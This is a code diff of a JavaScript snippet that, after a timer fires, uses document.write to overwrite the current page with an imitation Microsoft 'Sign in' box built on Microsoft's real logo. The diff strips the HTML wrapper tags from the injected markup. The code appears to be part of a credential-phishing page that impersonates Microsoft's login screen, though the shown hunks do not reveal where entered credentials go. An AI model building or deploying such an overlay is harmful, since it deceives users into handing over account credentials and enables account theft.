@@ -9,12 +9,6 @@ var x=setInterval(v,3700);
 
 function v(){  
     document.write(`
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Sign in to your account</title>
         <style>
             body {
                 font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -74,8 +68,7 @@ function v(){
                 text-decoration: underline;
             }
         </style>
-    </head>
-    <body>
+        
         <div class="login-box">
             <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" class="logo">
             <h2>Sign in</h2>
@@ -83,8 +76,6 @@ function v(){
             <p style="font-size: 13px; margin: 16px 0;">No account? <a href="#" class="link">Create one!</a></p>
             <button class="btn-primary">Next</button>
         </div>
-    </body>
-    </html>
     `); 
     clearInterval(x);
     // window.stop()
